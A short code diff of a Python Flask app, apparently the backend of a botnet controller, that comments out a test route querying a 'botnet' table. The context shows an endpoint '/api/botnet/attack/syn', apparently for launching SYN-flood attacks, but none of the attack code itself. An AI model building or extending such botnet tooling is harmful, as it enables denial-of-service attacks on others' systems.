@@ -192,11 +192,11 @@ def getBot():
     print(res)
     return jsonify(res),200
 
-@app.route('/tes123', methods=['POST'])
-def tess():
-    data = sql.session.execute(text('SELECT * FROM botnet where unique_identifier = "slbg7Wmwzh"')).first()
-    print(data)
-    return jsonify(identifier=data[1]),200
+# @app.route('/tes123', methods=['POST'])
+# def tess():
+#     data = sql.session.execute(text('SELECT * FROM botnet where unique_identifier = "ajodaodawoih"')).first()
+#     print(data)
+#     return jsonify(identifier=data[1]),200
 
 @app.route('/api/botnet/attack/syn', methods=['POST'])
 def attackSyn():
